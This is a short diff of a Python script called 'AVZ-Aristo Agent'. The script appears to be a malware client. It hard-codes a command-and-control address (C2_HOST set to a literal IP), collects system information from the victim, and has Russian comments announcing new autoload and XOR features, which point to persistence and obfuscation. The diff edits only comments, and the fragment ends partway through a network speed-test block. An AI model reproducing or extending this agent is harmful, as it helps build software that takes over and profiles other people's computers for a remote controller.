@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# AVZ-Aristo Agent v26.9 – измерение скорости канала
+# AVZ-Aristo Agent v26.10 – измерение скорости, автозагрузка, XOR
 import socket, json, time, os, platform, subprocess, threading, random, base64, glob, shutil
 
 C2_HOST = "80.249.146.202"
@@ -21,7 +21,7 @@ def get_info():
         "cpu": f"{os.cpu_count()} cores" if hasattr(os, 'cpu_count') else "unknown",
         "ram": "unknown"
     }
-    # Измерение скорости канала (простой тест)
+    # Измерение скорости канала
     try:
         import requests
         start = time.time()
